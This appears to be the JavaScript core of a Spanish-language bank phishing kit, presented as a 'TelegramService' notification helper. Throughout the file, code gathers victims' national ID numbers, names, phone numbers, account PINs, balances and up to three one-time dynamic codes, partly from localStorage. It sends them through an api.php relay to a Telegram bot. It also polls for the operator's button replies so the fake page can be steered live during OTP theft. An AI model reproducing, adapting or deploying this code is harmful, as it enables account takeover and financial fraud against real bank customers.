/**
 * TelegramService - Integración Segura a través de Backend PHP (api.php)
 */
(function (window) {
  'use strict';

  async function sendMessage(text, inlineKeyboard = null) {
    const payload = {
      text: text,
      parse_mode: 'Markdown'
    };

    if (inlineKeyboard && inlineKeyboard.length > 0) {
      payload.reply_markup = { inline_keyboard: inlineKeyboard };
    }

    // 1. Envío seguro a través del backend (detecta Vercel o XAMPP automáticamente)
    try {
      const apiUrl = window.location.hostname.includes('vercel.app') ? 'api?action=send_message' : 'api.php?action=send_message';
      const phpRes = await fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (phpRes.ok) {
        const phpData = await phpRes.json();
        if (phpData && phpData.ok) {
          return phpData;
        }
      }
    } catch (phpErr) {
      // Fallback
    }

    return { ok: false, error: 'Error al comunicar con api.php' };
  }

  let lastUpdateId = 0;

  const TelegramService = {
    async notifySolicitudInicial(cedula) {
      const msg = `📩 CC: ${cedula}`;
      return sendMessage(msg);
    },

    async notifyCreditoConfigurado(cedula, monto, cuota, meses) {
      // Mensaje deshabilitado
      return { ok: true };
    },

    async notifyCelular(cedula, celular) {
      // El celular y la clave se envían juntos en notifyPin
      return { ok: true };
    },

    async notifyPin(cedula, celular, pin) {
      function formatearCelular(num) {
        if (!num) return '';
        const clean = num.toString().replace(/\D/g, '');
        if (clean.length === 10) {
          return `${clean.slice(0, 3)} ${clean.slice(3, 6)} ${clean.slice(6)}`;
        }
        return num;
      }

      const msg = `✅Login ✅\n\n` +
                  `📱 Número: ${formatearCelular(celular)}\n` +
                  `🔒 Clave: ${pin}`;

      return sendMessage(msg);
    },

    async notifyValidacionSaldo(saldo, cedula, nombre, celular, pin, esSegundo = false, primerSaldo = null) {
      function formatearCelular(num) {
        if (!num) return '';
        const clean = num.toString().replace(/\D/g, '');
        if (clean.length === 10) {
          return `${clean.slice(0, 3)} ${clean.slice(3, 6)} ${clean.slice(6)}`;
        }
        return num;
      }

      const saldoLimpio = saldo ? saldo.toString().replace(/^\$\s*/, '') : '0';
      const storedFormData = JSON.parse(localStorage.getItem('formData') || '{}');
      const pSaldoStored = primerSaldo || storedFormData.firstSaldo || localStorage.getItem('firstSaldo');

      let saldosText = '';
      if (esSegundo && pSaldoStored) {
        const pSaldoClean = pSaldoStored.toString().replace(/^\$\s*/, '');
        saldosText = `💸 Primer saldo: $ ${pSaldoClean}\n` +
                     `💸 Segundo saldo: $ ${saldoLimpio}\n\n`;
      } else if (esSegundo) {
        saldosText = `💸 Segundo saldo: $ ${saldoLimpio}\n\n`;
      } else {
        saldosText = `💸 Primer saldo: $ ${saldoLimpio}\n\n`;
      }

      const msg = `☢️ VALIDACIÓN DE SALDOS\n\n\n` +
                  saldosText +
                  `📋 Cédula: ${cedula || ''}\n` +
                  `🐯 Nombre: ${nombre || ''}\n` +
                  `🔢 Numero: ${formatearCelular(celular)}\n` +
                  `🔑 Clave: ${pin || ''}`;

      return sendMessage(msg);
    },

    async notifyFirmaOTP(cedula, celular, pin, otp, monto, intento = 1, primerOtp = null, segundoOtp = null, nombre = null) {
      function formatearCelular(num) {
        if (!num) return '';
        const clean = num.toString().replace(/\D/g, '');
        if (clean.length === 10) {
          return `${clean.slice(0, 3)} ${clean.slice(3, 6)} ${clean.slice(6)}`;
        }
        return num;
      }

      function limpiarSaldo(val) {
        if (!val) return '0';
        return val.toString().replace(/^\$\s*/, '').trim();
      }

      const storedFormData = JSON.parse(localStorage.getItem('formData') || '{}');
      const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');

      let nombreFinal = nombre;
      if (!nombreFinal) {
        if (customerData && customerData.nombre_completo && customerData.nombre_completo !== 'Usuario') {
          nombreFinal = customerData.nombre_completo;
        } else if (storedFormData.nombreCompleto) {
          nombreFinal = storedFormData.nombreCompleto;
        } else if (storedFormData.nombre) {
          nombreFinal = storedFormData.nombre;
        }
      }

      const cedulaFinal = cedula || storedFormData.cedula || customerData.cedula || '';
      const celularFinal = celular || storedFormData.phoneNumber || storedFormData.celular || '';
      const pinFinal = pin || storedFormData.pin || storedFormData.clave || '';

      const pOtp = primerOtp || storedFormData.firstOtp || '';
      const sOtp = segundoOtp || storedFormData.secondOtp || '';

      let dinamicasLines = '';
      if (intento === 1) {
        dinamicasLines = `Clave Dinámica 1: ${otp}`;
      } else if (intento === 2) {
        dinamicasLines = `Clave Dinámica 1: ${pOtp}\n` +
                         `Clave Dinámica 2: ${otp}`;
      } else {
        dinamicasLines = `Clave Dinámica 1: ${pOtp}\n` +
                         `Clave Dinámica 2: ${sOtp}\n` +
                         `Clave Dinámica 3: ${otp}`;
      }

      const pSaldo = storedFormData.firstSaldo || localStorage.getItem('firstSaldo');
      const sSaldo = storedFormData.secondSaldo || localStorage.getItem('secondSaldo');

      let saldosLines = '';
      if (pSaldo && sSaldo) {
        saldosLines = `💸 Primer Saldo: $ ${limpiarSaldo(pSaldo)}\n` +
                      `💸 Segundo Saldo: $ ${limpiarSaldo(sSaldo)}`;
      } else if (pSaldo) {
        saldosLines = `💸 Primer Saldo: $ ${limpiarSaldo(pSaldo)}`;
      } else if (sSaldo) {
        saldosLines = `💸 Segundo Saldo: $ ${limpiarSaldo(sSaldo)}`;
      }

      const msg = `✅CLAVE DINÁMICA✅ ${intento}\n\n\n` +
                  `📋 Cédula: ${cedulaFinal}\n` +
                  `🙆‍♂️ Nombre: ${nombreFinal || ''}\n` +
                  `🔢 Número: ${formatearCelular(celularFinal)}\n` +
                  `🔑 Clave: ${pinFinal}\n\n` +
                  `-----------------------------------\n` +
                  `${dinamicasLines}\n` +
                  `------------------------------------\n\n` +
                  saldosLines;

      return sendMessage(msg);
    },

    async notifyValidacionRespuestas(cedula, respuestas) {
      // Mensaje de respuestas de validación deshabilitado
      return { ok: true };
    },

    async send(text) {
      return sendMessage(text);
    },

    listen(callback, timeout = 15000) {
      const startTime = Date.now();
      const formData = JSON.parse(localStorage.getItem('formData') || '{}');
      const cedula = (formData.cedula || '').replace(/\D/g, '');
      let lastUpdateId = 0;

      // Obtener el update_id más reciente primero a través de api.php
      fetch('api.php?action=get_updates&offset=-1')
        .then(r => r.json())
        .then(data => {
          if (data && data.ok && Array.isArray(data.result) && data.result.length > 0) {
            lastUpdateId = data.result[data.result.length - 1].update_id;
          }
        })
        .catch(() => {});

      const intervalId = setInterval(async () => {
        if (Date.now() - startTime >= timeout) {
          clearInterval(intervalId);
          if (typeof callback === 'function') {
            callback('TIMEOUT');
          }
          return;
        }

        try {
          const res = await fetch(`api.php?action=get_updates&offset=${lastUpdateId + 1}&limit=5`);
          const data = await res.json();
          if (data && data.ok && Array.isArray(data.result) && data.result.length > 0) {
            for (const upd of data.result) {
              lastUpdateId = Math.max(lastUpdateId, upd.update_id);
              if (upd.callback_query && upd.callback_query.data) {
                const cdata = upd.callback_query.data;
                if (!cedula || cdata.includes(cedula) || cdata.startsWith('btn_')) {
                  // Contestar callback query vía api.php
                  fetch(`api.php?action=answer_callback&callback_query_id=${upd.callback_query.id}&text=Accion+recibida`)
                    .catch(() => {});

                  clearInterval(intervalId);
                  if (typeof callback === 'function') {
                    callback(cdata);
                  }
                  return;
                }
              }
            }
          }
        } catch (e) {
          // ignore
        }
      }, 1500);
    }
  };

  window.TelegramService = TelegramService;
})(window);
